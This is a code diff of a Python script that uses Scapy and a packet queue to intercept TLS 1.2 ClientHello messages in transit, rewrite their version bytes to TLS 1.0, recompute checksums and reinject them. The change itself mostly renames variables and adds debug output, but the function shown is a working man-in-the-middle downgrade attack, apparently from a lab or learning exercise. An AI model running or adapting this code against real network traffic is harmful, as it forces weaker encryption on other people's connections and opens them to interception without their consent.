@@ -23,17 +23,14 @@ maxPacketsToStore = 100
 
 def downgradeTLS(packet):
   print("...")
-  pkt = IP(packet.get_payload())
+  scapy_packet = IP(packet.get_payload())
 
-  # Quick test to see if I can read any-thing at all.                     
-  if (pkt.haslayer(ICMP)):                                                
-    print(pkt.getlayer(ICMP).code)                                        
 
-  if not pkt.haslayer("Raw"):
+  if not scapy_packet.haslayer("Raw"):
     packet.accept();
 
   else:
-    tcpPayload = pkt["Raw"].load
+    tcpPayload = scapy_packet["Raw"].load
 
     # Adjusted the matching rules for Python 2 and old Scapy.
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
@@ -42,9 +39,11 @@ def downgradeTLS(packet):
       if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
         print("TLS v1.2, dropping down to v1.0")
         print("-----")
-        print(pkt.command()) 
+        print(scapy_packet.summary()) 
         print("-----")
-        print(pkt.show()) 
+        print(scapy_packet.command()) 
+        print("-----")
+        print(scapy_packet.show()) 
         print("-----")
 
         msgBytes = packet.get_payload()        # msgBytes is read-only, copy it
@@ -64,17 +63,17 @@ def downgradeTLS(packet):
         msg=b''.join(msgBytes2)
         packet.set_payload(msg)
         
-        msg=packet.get_payload()
-        del msg["IP"].chksum
-        del msg["TCP"].chksum
-        packet.set_payload(msg)
+        msg_tweak = IP(packet.get_payload())
+        del msg_tweak["IP"].chksum
+        del msg_tweak["TCP"].chksum
+        packet.set_payload(bytes(msg_tweak))                        
         
         # Comparing to the original packet
-        pktchk = IP(packet.get_payload())
+        scapy_packetchk = IP(packet.get_payload())
         print("-----")
-        print(pkt.command()) 
+        print(scapy_packet.command()) 
         print("-----")
-        print(pkt.show()) 
+        print(scapy_packet.show()) 
         print("-----")
 
 
